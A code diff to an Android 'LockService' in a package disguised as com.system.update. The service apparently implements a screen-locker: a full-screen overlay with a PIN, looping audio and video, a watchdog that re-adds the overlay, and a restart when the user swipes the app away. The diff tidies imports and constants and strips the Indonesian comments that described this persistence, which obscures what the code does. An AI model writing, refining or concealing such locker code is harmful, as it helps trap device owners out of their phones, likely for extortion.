@@ -1,9 +1,11 @@
 package com.system.update
 
-import android.app.*
+import android.app.AlarmManager
+import android.app.Notification
+import android.app.PendingIntent
+import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.graphics.PixelFormat
 import android.media.MediaPlayer
 import android.net.Uri
 import android.os.Build
@@ -20,6 +22,8 @@ import androidx.core.app.NotificationCompat
 class LockService : Service() {
 
     companion object {
+        const val NOTIF_ID = 100
+
         @Volatile var currentOverlay: View? = null
         @Volatile var currentType: String? = null
         @Volatile var currentPin: String = "1234"
@@ -113,7 +117,6 @@ class LockService : Service() {
                 else -> return
             }
 
-            // Wrap dengan VideoView background kalau ada video
             val root: View = if (!videoUrl.isNullOrEmpty()) {
                 wrapWithVideo(baseView)
             } else {
@@ -123,7 +126,6 @@ class LockService : Service() {
             wm.addView(root, LockOverlayView.paramsFull())
             currentOverlay = root
 
-            // Start audio looping
             if (!audioUrl.isNullOrEmpty()) {
                 startAudioLoop(audioUrl!!)
             }
@@ -194,7 +196,7 @@ class LockService : Service() {
     }
 
     // ============================================================
-    // WATCHDOG (re-add overlay kalau kehapus)
+    // WATCHDOG
     // ============================================================
     private fun startWatchdog() {
         watchdog?.removeCallbacksAndMessages(null)
@@ -203,8 +205,8 @@ class LockService : Service() {
             override fun run() {
                 if (!isActive) return
 
-                // Cek lock jam expired
-                if (currentType == "time" && lockUntil > 0 && System.currentTimeMillis() >= lockUntil) {
+                if (currentType == "time" && lockUntil > 0 &&
+                    System.currentTimeMillis() >= lockUntil) {
                     stopLock()
                     return
                 }
@@ -240,7 +242,6 @@ class LockService : Service() {
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
-        // Restart service kalau user swipe app dari recent
         if (isActive) {
             try {
                 val restart = Intent(applicationContext, LockService::class.java)
@@ -267,10 +268,4 @@ class LockService : Service() {
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
-
-    companion object_ {
-        const val NOTIF_ID = 100
-    }
 }
-
-private const val NOTIF_ID = 100
